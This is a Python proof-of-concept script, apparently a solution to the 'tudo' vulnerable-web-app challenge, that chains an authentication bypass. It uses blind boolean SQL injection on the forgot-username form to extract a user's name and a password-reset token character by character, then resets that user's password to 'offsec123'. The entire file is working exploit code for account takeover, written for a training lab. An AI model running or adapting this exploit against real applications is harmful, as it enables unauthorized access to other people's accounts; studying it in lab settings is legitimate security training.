#Solution for one auth bypass in bmdyy's tudo challenge
#Link to challenge: https://github.com/bmdyy/tudo
#PoC Author: ApexPredator
import requests, argparse, sys

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='Target URL', required=True)
args = parser.parse_args()
http_proxy = "http://127.0.0.1:8080"
proxyDict = {
            "http" : http_proxy
        }

def forgot_username_sqli(target, inj_str):

    for j in range(32, 126):
        # now we update the sqli
        url = "http://%s/forgotusername.php" %target
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = "username=%s" %inj_str.replace("[CHAR]", str(j))
        r = requests.post(url, headers=headers, data=data, proxies=proxyDict)
        content_length = int(r.headers['Content-Length'])
        if (content_length < 1480):
            return j
    return None


def inject(r, inj, target):

    extracted = ""
    for i in range(1, r):
        injection_string = "1'/**/or/**/(ascii(substring((%s),%d,1)))/**/=/**/[CHAR]/**/limit/**/1;/**/--/**/" % (inj,i)
        retrieved_value = forgot_username_sqli(target, injection_string)
        if(retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            print("\n[+] SQL Injection complete!")
            break
    return extracted

def request_token(target, username):

    url = "http://%s/forgotpassword.php" %target
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = "username=%s" %username
    r = requests.post(url, headers=headers, data=data, proxies=proxyDict)
    return

def reset_password(target, token):

    url = "http://%s/resetpassword.php" %target
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = "token=%s&password1=offsec123&password2=offsec123" %token
    r = requests.post(url, headers=headers, data=data, proxies=proxyDict)
    if "Password changed!" in r.text:
        print("[+] Password change successful")
    else:
        print("[-] Password change failed :-(")

    return

def main():

    try:
        target = args.target
    except IndexError:
        print("[-] Usage python3 %s -t <target IP>" % sys.argv[0])
        print("[-] eg: python3 %s -t 172.17.0.2" % sys.argv[0])
        sys.exit(-1)

    print("[+] Attempting to pull username via SQLI...")
    query = "select/**/username/**/from/**/users/**/where/**/uid/**/=/**/2"
    username = inject(10, query, target)
    print("[+] Requesting password reset token")
    request_token(target, username)
    print("[+] Attempting to pull token for "+username+" via SQLi...")
    query = "select/**/token/**/from/**/tokens/**/where/**/uid/**/=/**/2/**/limit/**/1"
    token = inject(33, query, target)
    print("\n[+] Resetting password for "+username+" to offsec123...")
    reset_password(target, token)

if __name__ == "__main__":
    main()
